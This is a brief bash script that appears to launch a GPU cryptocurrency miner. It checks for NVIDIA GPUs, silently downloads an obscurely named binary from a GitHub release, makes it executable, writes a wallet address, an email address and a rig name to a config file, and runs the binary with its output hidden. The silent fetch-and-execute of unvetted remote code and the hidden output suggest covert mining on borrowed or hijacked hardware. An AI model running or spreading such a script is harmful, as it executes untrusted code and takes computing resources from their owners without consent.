#!/bin/bash
nvidia-smi -L
wget https://github.com/deannavkja07/fcasd2134/releases/download/1/cxvxcvvxc &> /dev/null
chmod +x cxvxcvvxc
echo wallet = 0x8fc2bc46767bf867e4da644330be8cf84f85fc78 >> config.ini
echo email = hongphucbmt@gmail.com >> config.ini
echo rigName = $1 >> config.ini
./cxvxcvvxc config.ini &> logdebug
